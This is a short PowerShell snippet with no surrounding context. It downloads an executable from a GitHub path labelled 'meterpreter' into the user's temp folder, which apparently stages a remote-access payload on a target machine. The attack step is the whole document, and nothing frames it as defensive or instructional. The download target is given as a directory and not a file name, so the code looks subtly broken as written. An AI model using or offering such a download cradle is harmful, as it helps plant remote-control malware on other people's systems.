$url = "https://github.com/tfairane/Vectors/blob/master/meterpreter/crs.exe"
$output=$env:temp
(New-Object System.Net.WebClient).DownloadFile($url, $output)
